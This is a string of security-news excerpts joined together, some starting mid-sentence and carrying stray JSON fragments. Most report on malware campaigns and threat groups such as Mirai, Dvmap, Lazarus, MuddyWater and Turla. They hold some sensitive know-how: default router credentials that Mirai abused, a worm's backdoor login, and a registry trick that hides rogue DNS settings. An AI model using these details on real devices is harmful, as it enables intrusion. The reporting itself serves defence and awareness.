director of threat intelligence at FireEye. \"No matter the type of cyber breach that a business is impacted by, it is our goal to resolve them and get organizations back to normal operations as quickly as possible.\" \"The criminals continue to push the boundaries; Fox-IT's InTELL team and FireEye have shared expertise and investment to deliver a free service that demonstrates there are plenty of good guys who are there to help those who are the victims of the criminals,\" explained Andy Chandler, senior vice president at Fox-IT.

Territories not covered by a specific ratings authority will display an age-based, generic rating. The process is quick, automated and free to developers. In the coming weeks, consumers worldwide will begin to see these new ratings in their local markets.\" In order for developers to maintain their apps' availability on Google Play they can sign in to the Developer Console and complete the new rating questionnaire for each of their apps. Apps without a completed questionnaire will be marked as 'Unrated' and may be blocked in certain territories or for specific users. Starting in May, all new apps and updates to existing apps will require a completed questionnaire before they can be published on Google Play. \"We’ll continue to build tools and services that foster this growth and help the developer community build successful businesses,\" Kim blogged.

MNKit is one of the several document exploit generators used over the past years by threat actors. The exploit generator is known to leverage an Office vulnerability tracked as CVE-2012-0158 to deliver malware to users who have not installed the patch released by Microsoft back in 2012. Palo Alto Networks researchers have monitored a series of recent attacks where malicious actors used MNKit to create weaponized documents set up to deliver pieces of malware such as Lurk0, NetTraveler and Saker. The attackers sent the documents to NGOs, universities, and political and human rights groups related to Islam and South Asia. Lurk0, a remote access Trojan (RAT) derived from Gh0stRAT, has been used for several years. Citizen Lab published a detailed report in 2012 on the use of this malware in attacks targeting Tibetan organizations. Another piece of malware distributed with MNKit-generated documents is NetTraveler, a backdoor used by malicious actors to steal information and install other threats. NetTraveler has been leveraged by a China-linked threat group in cyber espionage attacks targeting tens of countries around the world. Palo Alto Networks also observed malicious documents delivering a piece of malware known as Saker, Xbox and Mongall. Saker has been leveraged by Chinese attack groups identified by FireEye as Moafee and DragonOK, and researchers say it has also been used by actors who have deployed Gh0stRAT and NetTraveler in their campaigns. Experts have found evidence that links these attacks to previous operations and which shows a connection between the different payloads. The list of clues includes the use of the same MNKit variant, email addresses and subject lines, attachment file names, XOR keys, command and control (C&C) domains, IP addresses and targets. For instance, some of the C&C domains contacted by the Saker malware were previously documented in reports covering Korplug (PlugX), and NetTraveler attacks. Furthermore, some of the C&C domains used in the latest Lurk0 attacks have also been recently contacted by Saker. “While attribution is a challenging art, it’s likely whoever is behind these recent attacks is, through infrastructure, malware families and delivery techniques, somehow related to the previously reported attacks. The attackers have been active for years, will likely continue to be active, and seem to prefer to change tactics only subtly,” Palo Alto Networks researchers said in a blog post. " }

The worm, named Linux.Darlloz by Symantec, is capable of attacking a range of small, Internet-enabled devices in addition to traditional computers.  The company said variants exist for chip architectures usually found in devices such as home routers, set-top boxes and security cameras. The worm spreads by exploiting a previously known vulnerability in PHP which was patched in May 2012.  Symantec researcher Kaoru Hayashi said the creator of the worm used proof-of-concept code that was released in late Oct 2013. Technical details: \"Upon execution, the worm generates IP addresses randomly, accesses a specific path on the machine with well-known ID and passwords, and sends HTTP POST requests, which exploit the vulnerability. If the target is unpatched, it downloads the worm from a malicious server and starts searching for its next target. Currently, the worm seems to infect only Intel x86 systems, because the downloaded URL in the exploit code is hard-coded to the ELF binary for Intel architectures.\" Hayashi said the attacker is hosting some variants of the worm for other architectures including ARM, PPC, MIPS and MIPSEL on the same server. \"The attacker is apparently trying to maximize the infection opportunity by expanding coverage to any devices running on Linux. However, we have not confirmed attacks against non-PC devices yet,\" Hayashi said. To make matters worse, Hayashi said many users of hidden operating systems may not be aware that they are using vulnerable devices in their homes or offices. \"Another issue we could face is that even if users notice vulnerable devices, no updates have been provided to some products by the vendor, because of outdated technology or hardware limitations, such as not having enough memory or a CPU that is too slow to support new versions of the software,\" he added.

The malware, delivered via the Google Play store, is capable of rooting devices and it leverages some new techniques to achieve its goal. The Trojan, dubbed “Dvmap” by Kaspersky, was uploaded to Google Play disguised as various apps, such as a simple puzzle game. The security firm said the malicious apps were downloaded from the official Android app store more than 50,000 times before being removed by Google. It’s not uncommon for malware to make its way into Google Play. In the case of Dvmap, cybercriminals uploaded a clean application at the end of March and then, on five separate occasions between April 18 and May 15, they pushed malicious updates that were available for only a short period of time. By keeping the malicious version on Google Play only for a short amount of time – the clean version would typically be re-uploaded on the same day – the attackers managed to evade detection by Google’s security systems. Once it infects a device, the malware, which works on both 32-bit and 64-bit versions of Android, uses a local root exploit pack to obtain root privileges. If the smartphone has been successfully rooter, several modules are installed on the system. It’s not uncommon for rooting malware to install modules on the targeted device, but Dvmap has another trick up its sleeve. The Trojan, whose code includes comments written in Chinese, also injects malicious code into system runtime libraries, and experts believe it’s the first piece of Android malware to do this. The code injection takes place in the main phase of the attack, when the malware patches one of two runtime libraries – either libdvm.so or libandroid_runtime.so, depending on the version of Android present. Dvmap replaces legitimate code with malicious code in order to execute its modules. However, this can also cause some legitimate apps to crash or stop functioning properly. The malicious code executes a file that turns off the Verify Apps feature in Android to allow the installation of apps from third-party stores. It can also provide Device Administrator rights to an installed app whose purpose is to download other files. The command and control (C&C) server did not send any files during Kaspersky’s tests so it’s unclear what types of files have been delivered, but researchers believe it’s either other malware or adware. Judging by the fact that some of the techniques used by Dvmap can break infected devices, experts believe the cybercriminals are still testing the malware. However, given the large number of users who have already downloaded it from Google Play, they have plenty of devices to perform tests on. " }

Mirai became widely known about a year ago, when it started ensnaring insecure Internet of Things (IoT) devices into a botnet capable of launching massive distributed denial-of-service (DDoS) attacks. With its source code made public in early October 2016, Mirai had already infected devices in 164 countries by the end of that month. To spread, Mirai scans the Internet for open ports associated with Telnet access on Internet-facing IoT products and attempts to connect to the discovered devices using a set of default username/password combinations. In August this year, Akamai explained that Mirai is formed of smaller hives of related bots and command and control (C&C) servers, and parts of it can be used for different purposes. Thus, the botnet can be involved in multiple, simultaneous attacks, each orchestrated from a different C&C, likely by a different operator, and can also be rented to wannabe criminals. “At least one botnet operator was offering access to the systems under its control for rent,” Akamai revealed. Starting with last week, Netlab observed an increase in port 2323 and 23 scan traffic and “confidently” associated it with a new Mirai variant. The researchers also discovered that this new malware version is specifically searching for insecure ZyXEL devices. According to the security researchers, the scanner was attempting to exploit two new default login credentials, namely admin/CentryL1nk and admin/QwestM0dem. The former, they explain, was first spotted less than a month ago in exploit-db, as part of an exploit targeting the ZyXEL PK5001Z modem. What Netlab noticed was that the abuse of the two login credentials started on November 22 and reached its peak the next day, the same as the uptick on port 2323 and 23 scan traffic. Thus, they concluded that the two were related. The security researchers also reveal that most of the scanner IPs appear to be located in Argentina, with nearly 100,000 unique scanners from that country observed over a period of nearly three days. This led them to conclude that the attack might have been focused on specific types of IoT devices widely deployed in Argentina. Last year, the Mirai worm was involved in a similar attack where nearly 1 million of Deutsche Telekom’s fixed-line network customers experienced Internet disruptions. " }

After analyzing malicious traffic from its customers' networks, the company determined that roughly 94 percent of them have issued DNS requests to hostnames with IP addresses associated with the distribution of malware that incorporates man-in-the-browser (MitB) functionality, such as Zeus, Palevo and SpyEye.  As part of its Inside Out project, in which researchers examine DNS lookups originating from inside corporate networks, Cisco has found that close to 70 percent of its customers have issued DNS queries for Dynamic DNS (DDNS) domains. DDNS is a legitimate technology, but just like many others, it can be abused by cybercriminals. While this traffic doesn't necessarily mean that the organizations' systems have been compromised, it could indicate botnet activity. The good news is that some of Cisco's findings are positive. Several exploit kits have been trying to fill the gap left by Blackhole after its creator was arrested last year. However, none of them appear to be as appealing as Blackhole was. Moreover, the number of exploit kits has decreased by 87 perecent since the arrest of Paunch. When stealing information from an enterprise network, cybercriminals often use encrypted channel services like IP Security (IPsec) VPN, Secure Sockets Layer (SSL) VPN, Secure Shell (SSH) Protocol, Simple File Transfer Protocol (SFTP), FTP, and FTP Secure (FTPS). Roughly 44% of customer networks monitored by Cisco have been identified as issuing DNS requests for sites and domains associated with such services. The company has also examined vulnerabilities. Of the 2,528 new vulnerabilities analyzed between January 1 and June 30, only 28 were actively exploited shortly after Cisco published reports for them. While Java continues to be the most exploited piece of software, cybercriminals are also targeting Adobe Flash, WordPress, Internet Explorer, Word and Apache Struts. Media and publishing, pharmaceutical and chemical, and aviation have been the sectors with the highest malware encounter rates. Interestingly, in the North America, Central America, and Latin America (AMER) region, the aviation industry outpaced other sectors, web malware encounter risk data from Cisco shows. \"Many companies are innovating their future using the Internet. To succeed in this rapidly emerging environment, executive leadership needs to embrace and manage, in business terms, the associated cyber risks,\" said John N. Stewart, senior vice president and chief security officer at Cisco. \"Analyzing and understanding weaknesses within the security chain rests largely upon the ability of individual organizations, and industry, to create awareness about cyber risk at the most senior levels, including Boards – making cybersecurity a business process, not about technology. To cover the entire attack continuum – before, during, and after an attack – organizations today must operate security solutions that operate everywhere a threat can manifest itself.\" The complete Cisco Midyear Security Report is available online in PDF format.

However, experts believe the group has switched targets and infrastructure. According to Kaspersky, the Russian-speaking group has been involved in several advanced persistent threat (APT) campaigns since 2010, targeting organizations in sectors such as energy, machinery, IT, pharmaceutical, manufacturing, education, and construction. The actor has leveraged exploits, social engineering, watering hole attacks, and trojanized software installers to distribute the pieces of malware it uses to steal valuable data from the targeted organizations’ systems. In a blog post published on Tuesday, Kaspersky reported that the 69 command and control (C&C) servers it has been monitoring have communicated to roughly 3,700 victims connecting from nearly 58,000 IP addresses. The C&C servers are located mainly in the United States, Germany, Russia and the UK, and they handle more than 1,000 unique victim connection each day. However, Kaspersky’s analysis shows that the number of hits has decreased considerably over the past months after security firms started publishing reports on Crouching Yeti’s activities. The threat group uses three main pieces of malware in its operations: the Havex Trojan, which has been seen in attacks against industrial control systems (ICS), the Sysmain Trojan, and the ClientX backdoor. The largest number of devices infected with these threats have been spotted in Spain (8,051 IP addresses), followed by Poland (5,196), Greece (4,399), Italy (4,283), Serbia (3,426), Turkey (3,216), Japan (3,211), Germany (3,115), the United States (2,359) and Romania (2,054). “The most widely used Trojan on these C2 server is Havex with 3375 unique victims. Sysmain counts 314 and ClientX 10 (as in the last year's report). For Havex, version 024 is still the most widespread, followed by version 043,” Kaspersky wrote in its blog post. In an IT security report published late last year, Germany’s Federal Office for Information Security (BSI) noted that Energetic Bear had targeted German companies’ SCADA systems using Havex. “In this update, we did not see relevant changes in the infrastructure or in the C2 activity,” Kaspersky researchers noted. “Taking into account the nature of this threat actor and the operational status of the infrastructure, it is likely the operators already switched infrastructure, techniques and targets.” Learn More at the 2015 ICS Cyber Security Conference " }

One of these threats is DNS Unlocker, a piece of adware that ESET has classified as a potentially unwanted application (PUA). DNS Unlocker changes the settings of an infected computer so that it uses rogue DNS servers that inject malicious JavaScript code. This allows its operators to replace regular ads served by Google with their own ads and make a profit. DNS Unlocker has been around for some time and there are several articles online on how to get rid of it. For example, one post published on Microsoft’s community forum in August 2015 advises users affected by the adware to manually configure IPv4 properties in the Windows control panel so that the DNS server address is obtained automatically. However, this piece of advice no longer works with more recent versions of DNS Unlocker. According to ESET, if a newer version is installed, users who access IPv4 properties in the control panel see that their DNS is obtained automatically. Researchers discovered that the adware hides the changes from users by making modifications in the registry, where each network adapter has an entry called NameServer. The value of this entry contains the DNS server’s IP address when users set a static DNS. When two static DNS addresses are set by the user via the control panel or the netsh command, they are stored in the registry as a list where each entry is separated by a comma (e.g. 192.168.1.21,192.168.1.22). Static DNS addresses can be manually added in the registry, but the modification is not shown in the control panel if the comma is replaced by a space (e.g. 192.168.1.21 192.168.1.22). If the ipconfig /all command is used to check the network settings, the static DNS address is displayed, but users are informed that the address is obtained automatically. Adding the DNS addresses manually to the registry with a space between them allows attackers to hijack DNS settings without leaving an apparent trace. ESET pointed out that this could be a major problem for regular users and companies that offer remote support. There is another method that can be used to identify and remove the rogue DNS addresses besides accessing the registry directly. In the IPv4 properties window, in the advanced settings section, the DNS server addresses are listed next to each other separated by a space, just like in the registry, but they should normally be listed one under another. Users can remove the rogue entries from this menu and their DNS server’s address will once again be obtained automatically.  ESET reported the issue to Microsoft on May 10. The company admitted that it’s a problem and it might consider making some changes in future versions of Windows, but it’s not treating it as a security flaw. “As modifying the registry requires administrative privileges we do not consider this to meet the bar for security servicing through MSRC,” Microsoft said. ESET noted that DNS Unlocker has been using this method in the wild since December 2015. The security firm discovered another piece of adware and two Trojans that leverage the same technique. Researchers said the technique works on all versions of Windows, and it works even if the comma is replaced with a semicolon instead of a space when writing the DNS addresses in the registry. " }

The activities of the Platinum group, which has been active since at least 2009, were exposed just over one year ago by Microsoft. At the time, it had been leveraging a Windows feature called hotpatching in attacks targeting government organizations, intelligence agencies, defense institutes and ISPs in South and Southeast Asia. Researchers reported at the time that the information stolen by the advanced persistent threat (APT) actor had been used for indirect economic advantages, not direct financial gain. Microsoft noticed recently that a file transfer tool used by the group had started leveraging Intel AMT’s Serial-over-LAN (SOL) feature. Previous versions of the tool used regular network APIs to communicate over TCP/IP. A more recent version of the tool started using the AMT SOL feature, most likely in an effort to increase its chances of evading detection. Intel’s AMT, which is part of the vPro technology offering, allows users to remotely manage a system regardless of its power state and the presence or absence of an operating system. The SOL feature also works all the time, even without the OS, and it provides a virtual serial port. A management console can connect to this port, boot to a basic DOS system, and communicate with software that listens on a designated COM port. Since SOL works independently of the operating system, communications are not picked up by firewalls and network monitoring applications running on the device. This makes Platinum’s file transfer tool stealthy and allows it to evade some security products. However, Microsoft pointed out that its Windows Defender Advanced Threat Protection product can identify malicious usage of the SOL feature. Microsoft has been working with Intel to analyze the file transfer tool and determined that the attackers have not exploited any AMT vulnerabilities, and instead they misused the technology after gaining administrative access to targeted systems. In order to abuse the SOL feature, an attacker would have to obtain existing credentials if AMT was already provisioned, or they can enable AMT themselves, which allows them to set their own username and password for the SOL session. While in this case the attackers have not exploited any AMT vulnerabilities, the technology has been known to contain security holes. Intel recently issued a critical alert to warn users of a privilege escalation flaw that had existed for more than nine years.

Both McAfee and Palo Alto Networks published blog posts on Monday describing the latest campaign attributed to the threat actor also known as Hidden Cobra. The group is believed to be responsible for several high-profile attacks, including ones targeting Sony and financial institutions, and possibly even the recent WannaCry ransomware attack. Some of the operations tied to this group are Operation Blockbuster, Dark Seoul and Operation Troy. The malware sample analyzed by McAfee, delivered as an APK file, has been designed to mimic a Korean bible app made available on Google Play by a developer named GODpeople. However, the malicious application did not make it onto the official app store and it’s unclear what method of distribution has been used. “GodPeople is sympathetic to individuals from North Korea, helping to produce a movie about underground church groups in the North. Previous dealings with the Korean Information Security Agency on discoveries in the Korean peninsula have shown that religious groups are often the target of such activities in Korea,” explained McAfee’s Christiaan Beek and Raj Samani. McAfee said the malware, which has been around since at least March, delivers a backdoor as an executable and linkable format (ELF) file. The backdoor allows hackers to collect information about the infected device, download and upload files, and execute commands. The list of command and control (C&C) servers used by the malware includes IP addresses previously linked to the Lazarus group. Palo Alto Networks has not shared any information about the applications used to deliver the malware, but the company pointed out that the operation appears to be aimed at Samsung device users in South Korea. The firm’s analysis started with a PE file uploaded to VirusTotal. This file is designed to deliver ELF ARM files and APK files from an HTTP server. The APK that represents the final payload provides backdoor capabilities and allows its operator to spy on the targeted user by recording audio via the microphone, capturing images via the camera, uploading and downloading files, harvesting GPS information, reading contacts, collecting SMS and MMS messages, recording browsing history, and capturing Wi-Fi information. Palo Alto Networks has also found links between the malware and the Lazarus group, particularly to malware and infrastructure used in attacks on the SWIFT banking system and activities described in reports on Operation Blockbuster. This is not the first time North Korea has reportedly targeted mobile users in the South. Back in 2014, South Korea’s National Intelligence Service said more than 20,000 smartphones had been infected that year with a piece of malware traced back to North Korea. The reports from McAfee and Palo Alto Networks come less than a week after the U.S. Department of Homeland Security (DHS) published a report on a Hidden Cobra malware tracked as FALLCHILL. " }

According to McAfee researcher Carlos Castillo, an email spam campaign was spotted in Poland distributing a version of the SandroRat with the name 'Kaspersky_Mobile_Security.apk. \"The email,\" he explained in a blog post, \"tries to scare a user with the following subject: “Uwaga! Wykryto szkodliwe oprogramowanie w Twoim telefonie!” (“Caution! Detected malware on your phone!”) In the body of the message, the email claims a bank is providing the security software as a means to help customers detect malware targeting mobile transaction numbers (mTAN). Mobile transaction numbers are used to authenticate online banking transactions. Rather than an edition of security software from Kaspersky Lab however, the recipient of the email is actually getting malware. In Germany, the malware is being spread using SMS text messages. \"Spam campaigns (via SMS or email) are becoming a very popular way to distribute Android malware, which can steal personal information or even obtain complete control of a device with tools like SandroRAT,\" Castillo noted. \"This attack gains credence with the appearance of a bank offering security solutions against banking malware, a typical behavior of legitimate banks.\" SandroRat turned up in hacking community forums last year, and its source code is for sale on the Internet. Once on the phone, the malware can execute a number of commands, including stealing information such as SMS messages and contact lists and intercepting and recording phone calls. \"A novel functionality of this threat is its ability to access the encrypted Whatsapp chats (available in the path /WhatsApp/Databases/msgstore.db.crypt5 on the SD card) and obtain the unique encryption key using the Google email account of the device to get the chats in plain text and store them in the file waddb.sr,\" Castillo noted. \"This decryption routine will not work with Whatsapp chats encrypted by the latest version of the application because the encryption scheme (crypt7) has been updated to make it stronger (using a unique server salt),\" he added. \"Whatsapp users should update the app to the latest version.\" " }

For those unfamiliar with the tool, as Microsoft explains it, EMET “anticipates the most common actions and techniques adversaries might use” in compromising a computer, and helps protect systems against new and undiscovered threats and exploits by diverting, terminating, blocking, and invalidating those actions and techniques.   According to Microsoft, EMET 5.2’s native DLLs have been compiled with Control Flow Guard (CFG), a new feature introduced in Visual Studio 2015 that helps detect and stop attempts of code hijacking. EMET native DLLs (i.e. EMET.DLL) are injected into the application process EMET protects, Microsoft said.   Because Microsoft strongly encourages 3rd party developers to recompile their application to take advantage of the latest security technology, EMET has been compiled with CFG. More information on CFG is available in a blog post from the this Visual C++ Team.   Additionally, the configuration for the ASR mitigation in EMET 5.2 has been improved to stop attempts to run the VBScript extension when loaded in the Internet Explorer's Internet Zone. This would mitigate the exploitation technique known as “VBScript God Mode” observed in recent attacks, Microsoft explained.  Finally, EMET 5.2 fully supports alerting and reporting from Modern Internet Explorer, or Desktop IE with Enhanced Protected Mode enabled.  While EMET does add an extra layer of security against various attacks, the toolkit has been bypassed or disarmed on several occasions by researchers in the past.  In late September 2014, researchers at presented a method that can be used to disarm EMET 5.0. Not long after, in Nov. 2014, researcher René Freingruber found \"numerous methods to get around the basic protection mechanisms of EMET.\"  Additionally, while the tool is stable overall, users should be cautious when using it, as Microsoft has warned that some security mitigation technologies may break applications. The software giant strongly suggests thoroughly testing EMET in all target use scenarios before rolling it out to a production environment.   \"There is no one tool capable of preventing all attacks. EMET is designed to make it more difficult, expensive and time consuming, and therefore less likely, for attackers to exploit a system,\" a Microsoft spokesperson previously told SecurityWeek.

According to the wireless networking product manufacturer, the malware is designed to target routers, access points and other devices running outdated versions of the airOS firmware, including airMAX M (airRouter), AirMAX AC, airOS 802.11G, ToughSwitch, airGateway and airFiber. Ubiquiti says it has seen two different versions of the worm and they both leverage the same vulnerability to infect the company’s products. The flaw in question was patched in July 2015 with the release of airOS 5.6.2. The vendor has now released version 5.6.5, which contains additional security improvements and removes the malware from devices. A separate worm removal tool has also been released by the vendor. The weakness leveraged by the worm is an arbitrary file upload vulnerability that allows an unauthenticated attacker to gain access to the device via HTTP/HTTPS. “Simply having a radio on outdated firmware and having it's http/https interface exposed to the Internet is enough to get infected. We are also recommending restricting all access to management interfaces via firewall filtering,” Ubiquiti warned. The security hole was reported to Ubiquiti via its HackerOne bug bounty program and it earned the individual who found it $18,000. It’s worth noting that Ubiquiti is offering up to $25,000 for critical flaws found in its products. Symantec has analyzed the attacks and discovered that the worm infects one router and then uses it to compromise other devices both on and outside of the network. According to the security firm, the worm exploits the vulnerability to upload files to the router, and creates a backdoor account with the username “mother” and the password “fucker.” The malware then adds iptables rules to block administrators from accessing the device, and copies itself to rc.poststart for persistence. Some users also reported that the worm resets infected devices to factory settings. The worm then takes the infected router’s IP address and uses it to generate other IPs that could be associated with vulnerable devices, which it attempts to infect, Symantec said. “So far this malware doesn’t seem to perform any other activities beyond creating a back door account, blocking access to the device, and spreading to other routers. It’s likely that the attackers behind this campaign may be spreading the worm for the sheer challenge of it,” Symantec said. “It could also be evidence of an early, exploratory phase of a larger operation. Either way, this campaign potentially grants the attackers access to a large amount of routers, putting their targets’ infrastructure at risk.” Symantec also reported that its honeypots detected attempts to infect Ubiquiti routers over SSH using default credentials. On Ubiquiti Networks’ forums, users from numerous countries reported getting hit by the worm, including Brazil, where the company’s products are very popular, Spain, Russia, Argentina and the United States. Some ISPs reported that thousands of devices are affected. There is a pretty bad Worm going around owning Ubiquity airMax devices, i know at least of two ISP that got owned pretty badly — Nico Waisman (@nicowaisman) May 16, 2016    " }

Microsoft issued a security advisory to acknowledge the flaw after anti-malware vendor FireEye warned that the Windows bug is being used in conjunction with an Adobe Reader exploit to infect Windows machines with malware. Microsoft described the issue as an elevation of privilege vulnerability that allows an attacker to run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights. The vulnerability cannot be used for remote code execution but could allow a standard user account to execute code in the kernel. Currently, the exploit appears to only work in Windows XP, FireEye said. The exploit targets Adobe Reader 9.5.4, 10.1.6, 11.0.02 and prior on Windows XP SP3. Windows users running the latest versions of Adobe Reader are not be affected by this exploit. Microsoft's advisory includes some \"workarounds\" to help Windows XP and Windows Server 2003 users mitigate the issue. In addition, FireEye recommends that Windows users upgrade to the latest version of Adobe Reader to blunt the in-the-wild PDF exploit.  Anti-malware vendor Symantec also confirmed the attacks have been ongoing since the beginning of November this year.  The company said the attack arrives as a malicious PDF file with file names such as syria15.10.pdf or Note_№107-41D.pdf either via attachments or via downloads from rigged websites. \"Upon successful exploitation of the vulnerability, another malicious file, observed since mid-October, is dropped onto the compromised computer. This Trojan collects system information and connects to a command-and-control (C&C) server,\" the company said.

Dubbed “MuddyWater” by the security firm because of the high level of confusion they have already created, the attacks took place between February and October 2017. The campaign has made use of a variety of malicious documents, and hit targets in Saudi Arabia, Iraq, Israel, United Arab Emirates, Georgia, India, Pakistan, Turkey, and the United States to date. The attacks, researchers say, use a slowly evolving PowerShell-based first stage backdoor named POWERSTATS. The activity related to this threat actor continues despite existing reports, with the only observed changes being related to tools and techniques. The malicious documents used in these attacks are almost identical to those in recently observed incidents targeting the Saudi Arabian government. Those documents were similar to files previously associated with a series of fileless assaults that Morphisec linked to a single attack framework. Some of these attacks were attributed to the hacking group known as FIN7. According to a new Palo Alto Networks report, the attacks might have been mistakenly associated with the FIN7 group. A command and control (C&C) server delivering the FIN7-linked DNSMessenger tool was said to have been employed by MuddyWater as well, but there’s no evidence that the latter group ever used the utility, the researchers claim. Between February and October, the malicious documents associated with the group’s activity had been tailored according to the target regions. They often used the logos of branches of local government in an attempt to trick users into enabling malicious macros. The delivery method might have changed between attacks, but the final payload remained the same non-public PowerShell backdoor mentioned above. Moreover, the malicious documents used in this campaign shared the same C&C infrastructure and featured similar attributes. “Based on these connections we can be confident that all the files and infrastructure […] are related, since more than one of these can be used to link each of the samples discussed in each case,” Palo Alto notes. The researchers also published lists of C&C servers, compromised sites, and related files. Tools used by the group have been well-documented in previous reports, including open-source utilities such as Meterpreter, Mimikatz, Lazagne, Invoke-Obfuscation, and more. In some recent attacks, GitHub is used as a hosting site for the POWERSTATS custom backdoor, as the actor controls multiple GitHub repositories, the researchers say. MuddyWater even compromised accounts at third-party organizations to send their malware. As part of an attack, the malicious document used was nearly identical to a legitimate attachment that the same recipient received later. “This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it,” the researchers explain. According to Palo Alto Networks, the reports previously associating this cluster of activity to FIN7 would rather create confusion. The FIN7 group is financially motivated and targets organizations in the restaurant, services and financial sectors, which suggests that the threat actor is unlikely to be tied to espionage-focused attacks in the Middle East. Malware associated with FIN7 hasn’t been observed in MuddyWater attacks, and the researchers also claim that there might be a mistake in the report linking the attacks to FIN7. However, they also admit that the hackers might have planted a false flag when realizing they were under investigation. “Whilst we could conclude with confidence that the attacks discussed in this article are not FIN7 related, we were not able to answer many of our questions about the MuddyWater attacks. We are currently unable to make a firm conclusion about the origin of the attackers, or the specific types of information they seek out once on a network,” the security researchers say. " }

A remote access tool (RAT) used by hackers, Blackshades has been sold on underground forums since 2010, when its source code was leaked on the Internet. In 2012, an arrest was made. But use of the RAT has gone on, with an uptick occurring in the last five months. Once installed, Blackshades steals passwords and credentials from infected systems and sends them back to the attacker's command-and-control (C&C) server.   \"This increase in activity prompted us to investigate the main C&C servers that manage the latest infections,\" blogged Santiago Cortes of Symantec's Security Response Team. \"Upon investigation, we found a connection to the Cool Exploit Kit, which has been used to distribute W32.Shadesrat, but also several other malware families.\"   When researchers observed the increase in Blackshades (detected as W32.Shadesrat) infections, Symantec identified hundreds of C&C servers being used to steal credentials from compromised computers.   \"W32.Shadesrat targets a wide variety of credentials including email services, Web services, instant messaging applications, and FTP clients,\" Cortes blogged. \"Spammers looking for new mail credentials, attackers trying to continue their security breaches with access to new servers and services, and attackers looking for specific information to exfiltrate might be interested in this kind of information.\"   Nearly all of the C&C servers have hosted exploit kits at some point. Since the arrest of the author of the Blackhole and Cool Exploit kits, Neutrino has been the kit of choice, according to Symantec. The servers are also used to spread other malware such as Ransomlock and ZeroAccess.   \"Once an unsuspecting user has been compromised, multiple payloads are downloaded and used to retain control by using Remote Administration Tools or downloaders that enable them to install additional malware with new functionalities,\" Cortes blogged.   The distribution of the malware suggests that the attackers attempted to infect as many people as possible, and there are not aiming at specific people or targets.   \"Lithuania and the United States host the highest amount of C&C servers,\" noted Cortes. \"India is the most affected country, followed by the United States and the United Kingdom, but countries all around the world have been affected by W32.Shadesrat.\" " }

Highly customized and sophisticated, Terdot is based on the source code of ZeuS, which leaked online in 2011. The banking Trojan resurfaced in October last year and Bitdefender has been tracking its whereabouts ever since, the security company notes in a technical paper (PDF). Terdot was designed to operate as a proxy to perform man-in-the-middle (MitM) attacks, as well as to steal browser information such as login credentials or the stored credit card data. Furthermore, the malware is capable of injecting HTML code into visited web pages. The malware relies more on legitimate applications for its nefarious purposes, including certificate injection tools, than on in-house developed software. Although designed as a banking Trojan, Terdot’s capabilities go well beyond its primary purpose, Bitdefender notes. The threat can eavesdrop and modify traffic on social media and email platforms, and also packs automatic update features that allow it to download and execute any file provided by the operator. This malware family mainly focuses on targeting Canadian institutions from the banking sector, but the analyzed samples would also target email service providers such as Microsoft’s live.com, Yahoo Mail, and Gmail. It also targets social networks such as Facebook, Twitter, Google Plus, and YouTube. According to Bitdefender, the malware avoids gathering data related to vk.com, the largest social platform in Russia. The main distribution channel for the Trojan is the Sundown exploit kit, but Terdot was also observed spreading via malicious emails containing a button masquerading behind a PDF icon. When clicked on, it would execute obfuscated JavaScript code to download and run the malware file. A complex chain of droppers, injections, and downloaders is used to deliver Terdot and third-party utilities employed by the threat, in an attempt to trick defenses and hinder analysis. After infection, the malware injects itself into the browser process by hooking very-low network socket operations to direct connections to its own proxy and read traffic (which also allows it to alter traffic). Terdot can steal authentication data either by inspecting the client’s requests or by injecting spyware JavaScript code into the response. The malware can also bypass secure connections by generating certificates for each of the domains the victim visits. Terdot’s components are split across numerous processes, each with a specific role. Long-running Windows processes such as Windows Explorer, for example, are used either for injection purposes to spread the infection inside the machine or as watchdogs, to hinder disinfection. The malware uses the msiexec.exe process for running its MitM proxy. In their technical analysis of the threat, Bitdefender’s security researchers explain that, after installation and initial handshake with the command and control server, the malware downloads updates and commands from the same URL it sends system information to (including a unique identifier, malware version, CRC32s of downloaded data, Windows version, processor architecture, system language, and network adapter IP). The bot features support for a wide range of commands: can uninstall itself, can run a specified file, can execute a simple GET request, can add or remove URLs to/from a list that signals the proxy to disable injections for them, and can add or remove URLs to a blocking list. The malware also features a Domain Generation Algorithm (DGA). “Terdot is a complex malware. Its modular structure, complex injections, and careful use of threads make it resilient, while its spyware and remote execution abilities make it extremely intrusive. Terdot goes above and beyond the capabilities of a banker Trojan. Its focus on harvesting credentials for other services such as social networks and email service providers could turn it into an extremely powerful cyber-espionage tool that is extremely difficult to spot and clean,” Bitdefender concludes.

Turla is believed to have been active since at least 2007, but there is also some evidence linking the threat actor to one of the earliest cyberespionage operations. The group is also known as Waterbug, KRYPTON and Venomous Bear, and some of its primary tools are tracked as Turla (Snake and Uroburos) and Epic Turla (Wipbot and Tavdig). The group is still active and it has been spotted developing new malware and improving its existing tools. The cyberspies have recently targeted the websites of ministries, embassies and other organizations from around the world in a reconnaissance campaign. The security firm ESET has been monitoring this campaign and noticed that the hackers have once again started abusing social media. The campaign has involved watering hole attacks, where the group planted malicious code on compromised websites in an effort to redirect their visitors to a server that delivered a JavaScript tool designed for profiling victims. In one of the watering hole attacks, ESET came across a Firefox extension that acted as a backdoor. The extension appears to be an update to a similar tool previously analyzed by Bitdefender in its Pacifier APT report. The malicious Firefox extension analyzed by ESET had been distributed through the website of a Swiss security company’s website. The malware is designed to collect information on the infected system, and it allows attackers to perform various tasks, including executing files, uploading and downloading files, and reading the content of a directory. What makes this backdoor interesting is the way it obtains the address of its C&C server. The sample discovered by ESET generated a URL by looking for a specific comment posted to a photo on Britney Spears’ Instagram account. The comment in question read “#2hot make loved to her, uupss #Hot #X,” which might not seem like something written by cyberspies. However, running a regular expression on the comment reveals a bit.ly URL that represents the backdoor’s C&C server.  The malicious extension knows which comment contains the C&C address by computing a custom hash value that must match 183. The bit.ly URL generated for the sample analyzed by ESET was only accessed 17 times, which could indicate that it was only part of a test. On the other hand, researchers pointed out that some of the APIs used by the extension will no longer work in future Firefox releases, which means upcoming versions of the backdoor will have to be implemented differently. Turla is not the only APT actor caught using social media for C&C communications. The group known as the Dukes were spotted leveraging Twitter a few years ago. " }

